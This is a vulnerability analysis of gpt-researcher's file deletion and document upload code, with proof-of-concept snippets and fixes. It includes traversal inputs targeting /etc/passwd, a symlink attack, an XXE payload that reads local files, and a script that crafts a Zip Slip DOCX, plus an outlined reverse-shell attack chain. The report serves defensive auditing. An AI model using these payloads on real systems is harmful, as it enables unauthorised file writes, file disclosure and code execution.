# GPT-Researcher Path Traversal Vulnerability Analysis

## Executive Summary

This document analyzes a potential path traversal vulnerability in the `handle_file_deletion` function of gpt-researcher's `backend/server/server_utils.py`. After thorough code review, we've determined that:

1. **The basic path traversal attack is MITIGATED** by the use of `os.path.basename()`
2. **However, there are RESIDUAL RISKS** related to symbolic links and lack of robust path validation
3. **A MORE SIGNIFICANT vulnerability exists** in the document upload/processing pipeline

## Vulnerability Details

### Location
- **File**: `backend/server/server_utils.py`
- **Function**: `handle_file_deletion` (lines 248-256)
- **Endpoint**: `DELETE /files/{filename}` (server.py:194-196)

### Vulnerable Code

```python
async def handle_file_deletion(filename: str, DOC_PATH: str) -> JSONResponse:
    file_path = os.path.join(DOC_PATH, os.path.basename(filename))
    if os.path.exists(file_path):
        os.remove(file_path)
        print(f"File deleted: {file_path}")
        return JSONResponse(content={"message": "File deleted successfully"})
    else:
        print(f"File not found: {file_path}")
        return JSONResponse(status_code=404, content={"message": "File not found"})
```

## Security Analysis

### 1. Direct Path Traversal (MITIGATED ✓)

**Attack Vector**: `DELETE /files/../../../etc/passwd`

**Result**: FAILS - `os.path.basename()` strips all directory components

```python
>>> os.path.basename("../../../etc/passwd")
'passwd'
>>> os.path.join("/my-docs", os.path.basename("../../../etc/passwd"))
'/my-docs/passwd'
```

The file operation is confined to `/my-docs/passwd`, NOT `/etc/passwd`.

### 2. Symbolic Link Attack (POTENTIAL RISK ⚠️)

**Attack Scenario**:
1. Attacker uploads a file to DOC_PATH
2. Through a separate vulnerability (e.g., command injection, archive extraction), creates a symlink:
   ```bash
   ln -s /etc/passwd /path/to/DOC_PATH/malicious_link
   ```
3. Attacker calls: `DELETE /files/malicious_link`
4. The system deletes the symlink or follows it to delete `/etc/passwd`

**Mitigation Status**: NOT PROTECTED - No symlink checking

### 3. Comparison with AutoGPT's Robust Implementation

AutoGPT uses a more secure approach (`autogpt/workspace/workspace.py`):

```python
@staticmethod
def _sanitize_path(relative_path: str | Path, root: str | Path = None,
                   restrict_to_root: bool = True) -> Path:
    # 1. Check for null bytes
    for null_byte in Workspace.NULL_BYTES:
        if null_byte in str(relative_path) or null_byte in str(root):
            raise ValueError("embedded null byte")

    # 2. Resolve paths
    root, relative_path = Path(root).resolve(), Path(relative_path)
    full_path = root.joinpath(relative_path).resolve()

    # 3. Verify path is within root
    if restrict_to_root and not full_path.is_relative_to(root):
        raise ValueError(f"Attempted to access path '{full_path}' outside of workspace '{root}'.")

    return full_path
```

**Key improvements**:
- Null byte checking
- Path resolution with `.resolve()` (follows symlinks and resolves `.` and `..`)
- Explicit validation that final path is within root using `.is_relative_to()`

## MORE CRITICAL VULNERABILITY: Document Processing Pipeline

### Attack Surface: File Upload + Document Loading

The more significant vulnerability is in how uploaded and downloaded documents are processed:

#### 1. File Upload Handler (server_utils.py:236-245)

```python
async def handle_file_upload(file, DOC_PATH: str) -> Dict[str, str]:
    file_path = os.path.join(DOC_PATH, os.path.basename(file.filename))
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    document_loader = DocumentLoader(DOC_PATH)
    await document_loader.load()  # ← Processes ALL files in directory

    return {"filename": file.filename, "path": file_path}
```

#### 2. Online Document Loader (online_document.py:36-60)

```python
async def _download_and_process(self, url: str) -> list:
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers, timeout=6) as response:
            content = await response.read()
            with tempfile.NamedTemporaryFile(delete=False, suffix=self._get_extension(url)) as tmp_file:
                tmp_file.write(content)  # ← Writes untrusted content
                tmp_file_path = tmp_file.name

            return await self._load_document(tmp_file_path, self._get_extension(url).strip('.'))
```

#### 3. Document Loaders (document.py:63-92)

The system uses various document loaders that could be vulnerable:
- `PyMuPDFLoader` - May have vulnerabilities processing malicious PDFs
- `UnstructuredWordDocumentLoader` - DOCX files are ZIP archives with XML
- `UnstructuredExcelLoader` - Can contain macros, external links
- `UnstructuredPowerPointLoader` - Can contain embedded objects

### Attack Scenarios

#### Scenario 1: Malicious DOCX with Zip Slip

**Attack Vector**: Upload/provide a malicious DOCX file containing files with path traversal in archive

```
malicious.docx (ZIP structure):
  - word/document.xml
  - ../../../../etc/cron.d/malicious  ← Path traversal in archive
```

When `UnstructuredWordDocumentLoader` extracts the DOCX:
1. If extraction doesn't sanitize paths, files escape to parent directories
2. Could write malicious cron jobs, .bashrc, .ssh/authorized_keys, etc.

#### Scenario 2: XXE in Office Documents

DOCX/XLSX files contain XML. If the parser doesn't disable external entities:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

Could lead to:
- Local file disclosure
- SSRF attacks
- DoS

#### Scenario 3: PDF Exploits

Malicious PDFs could exploit vulnerabilities in PyMuPDF:
- Buffer overflows
- Code execution via JavaScript
- File disclosure via embedded files

## Proof of Concept

### Setup

1. Start gpt-researcher server:
```bash
cd /srv/home/shiqiu/Anewbenchmark/gpt-researcher
python -m backend.server.server
```

2. Set DOC_PATH environment variable:
```bash
export DOC_PATH=/tmp/gpt-researcher-docs
mkdir -p $DOC_PATH
```

### PoC 1: Verify Path Traversal Protection

```python
import requests

# This should FAIL to traverse directories
response = requests.delete("http://localhost:8000/files/../../../etc/passwd")
print(f"Status: {response.status_code}")
print(f"Response: {response.json()}")
# Expected: 404 - File not found (looking for /tmp/gpt-researcher-docs/passwd)
```

### PoC 2: Symlink Attack (if applicable)

```bash
# Create a symlink in DOC_PATH
ln -s /tmp/sensitive_file.txt $DOC_PATH/link_to_sensitive

# Try to delete via API
curl -X DELETE http://localhost:8000/files/link_to_sensitive

# Check if original file was deleted
ls -la /tmp/sensitive_file.txt
```

### PoC 3: Malicious Document Upload

Create a test script to upload a crafted document:

```python
import requests
import zipfile
import io

def create_malicious_docx():
    """Create a DOCX with path traversal in archive"""
    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        # Normal DOCX structure
        zip_file.writestr('word/document.xml', '<?xml version="1.0"?><document>Test</document>')
        zip_file.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types></Types>')

        # Malicious file with path traversal
        # NOTE: Python's zipfile.extract has protection, but UnstructuredWordDocumentLoader might not
        zip_file.writestr('../../../tmp/pwned.txt', 'You have been pwned!')

    return zip_buffer.getvalue()

# Upload malicious DOCX
files = {'file': ('malicious.docx', create_malicious_docx(), 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')}
response = requests.post('http://localhost:8000/upload/', files=files)

print(f"Upload response: {response.json()}")

# Check if file was written outside DOC_PATH
import os
if os.path.exists('/tmp/pwned.txt'):
    print("VULNERABILITY CONFIRMED: File written outside DOC_PATH!")
    with open('/tmp/pwned.txt') as f:
        print(f"Content: {f.read()}")
else:
    print("Path traversal was mitigated")
```

## Complete Attack Chain

### Scenario: Remote Code Execution via Document Processing

1. **Reconnaissance**: Identify gpt-researcher instance
2. **Craft Payload**: Create malicious DOCX with:
   - Path traversal to write to `.bashrc` or cron
   - Embedded script for reverse shell
3. **Upload**: Use `/upload/` endpoint or provide via `document_urls`
4. **Trigger**: Document is automatically processed by DocumentLoader
5. **Exploitation**: Malicious file is extracted, code executes

## Recommendations

### Immediate Fixes

1. **Replace `os.path.basename()` with robust validation**:

```python
from pathlib import Path

def sanitize_path(filename: str, root_path: str) -> Path:
    """Securely sanitize file path within root"""
    # Check for null bytes
    if '\0' in filename:
        raise ValueError("Invalid filename: contains null byte")

    # Resolve paths
    root = Path(root_path).resolve()
    # Only use basename to prevent directory traversal
    safe_name = Path(filename).name
    full_path = (root / safe_name).resolve()

    # Verify within root
    if not full_path.is_relative_to(root):
        raise ValueError(f"Path traversal attempt: {filename}")

    # Check for symlinks
    if full_path.is_symlink():
        # Either reject or resolve and re-check
        resolved = full_path.resolve()
        if not resolved.is_relative_to(root):
            raise ValueError(f"Symlink points outside workspace: {filename}")

    return full_path

async def handle_file_deletion(filename: str, DOC_PATH: str) -> JSONResponse:
    try:
        file_path = sanitize_path(filename, DOC_PATH)
        if file_path.exists():
            file_path.unlink()
            return JSONResponse(content={"message": "File deleted successfully"})
        else:
            return JSONResponse(status_code=404, content={"message": "File not found"})
    except ValueError as e:
        return JSONResponse(status_code=400, content={"message": str(e)})
```

2. **Validate document processing**:
   - Scan uploaded files for malicious content
   - Use safe extraction methods for archives
   - Disable XXE in XML parsers
   - Run document processing in sandboxed environment

3. **Implement file type validation**:
   - Check magic bytes, not just extensions
   - Whitelist allowed file types
   - Limit file sizes

### Long-term Improvements

1. Adopt AutoGPT's `Workspace` class for all file operations
2. Run document processing in isolated containers
3. Implement Content Security Policy for uploaded content
4. Add file integrity monitoring
5. Audit all uses of `os.path.join()` in codebase

## Testing Checklist

- [ ] Test basic path traversal: `../../../etc/passwd`
- [ ] Test null byte injection: `file.txt\x00.pdf`
- [ ] Test symlink creation and deletion
- [ ] Test malicious ZIP/DOCX upload
- [ ] Test XXE in XML documents
- [ ] Test malicious PDF processing
- [ ] Test file size limits
- [ ] Test concurrent upload/delete (TOCTOU)

## Conclusion

While the `handle_file_deletion` function has basic protection via `os.path.basename()`, it lacks the robust validation present in similar systems like AutoGPT. More critically, the document upload and processing pipeline presents significant attack surface for:

1. Archive extraction vulnerabilities (Zip Slip)
2. XXE attacks in Office documents
3. Malicious document processing exploits

**Severity**: Medium to High (depending on environment and permissions)

**Exploitability**: Medium (requires understanding of document structure)

**Impact**: High (potential for arbitrary file write/delete, code execution)

## References

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability)
- [XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
